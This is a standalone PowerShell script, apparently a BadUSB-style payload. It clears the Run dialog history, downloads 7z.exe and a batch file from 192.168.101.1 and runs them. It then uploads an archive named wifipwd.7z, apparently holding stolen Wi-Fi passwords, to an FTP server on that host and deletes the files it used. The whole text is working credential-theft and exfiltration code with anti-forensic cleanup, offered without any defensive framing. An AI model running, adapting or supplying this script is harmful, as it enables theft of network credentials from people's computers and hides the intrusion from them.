reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f;
(New-object System.Net.WebClient).DownloadFile('http://192.168.101.1/7z.exe','C:\7z.exe');
(New-object System.Net.WebClient).DownloadFile('http://192.168.101.1/get.bat','C:\Users\Public\get.bat');
C:\Users\Public\get.bat;
$fileinf=New-Object System.Io.FileInfo("C:\wifipwd.7z");
$ftp = [System.Net.FtpWebRequest] [System.Net.FtpWebRequest]::Create("ftp://192.168.101.1/"+$fileinf.name)
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftp.Credentials = new-object System.Net.NetworkCredential("admin","admin")
$ftp.UseBinary = $true
$ftp.UsePassive = $true
$content = [System.IO.File]::ReadAllBytes($fileInf.fullname)
$ftp.ContentLength = $content.Length
$rs = $ftp.GetRequestStream()
$rs.Write($content, 0, $content.Length)
$rs.Close()
$rs.Dispose()
Remove-Item c:\wifipwd.7z
Remove-Item c:\7z.exe
Remove-Item c:\Users\Public\get.bat
Remove-Item c:\Users\Public\get.ps1